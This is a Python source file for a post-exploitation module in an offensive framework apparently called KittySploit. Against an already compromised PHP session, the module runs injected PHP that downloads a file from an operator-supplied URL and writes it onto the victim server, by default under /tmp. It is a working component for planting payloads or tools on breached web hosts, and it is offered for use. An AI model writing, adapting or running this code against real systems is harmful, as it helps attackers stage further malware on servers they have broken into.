from kittysploit import *

class Module(Post):

	__info__ = {
		"name": "Web Download File",
		"description": "Download a file from a web server",
		"author": "KittySploit Team",
		"session_type": SessionType.PHP,
		"arch": Arch.PHP,
	}	
	
	url = OptString("", "Url to download file", True)
	rpath = OptString("/tmp", "Remote path to download file", True)
		
	def run(self):	
		result = self.cmd_execute(f'@file_put_contents("${self.rpath}",file_get_contents("${self.url}"));')
		if result:
			print_info(result)
			return True
		else:
			print_error("Failed to download file")
			return False
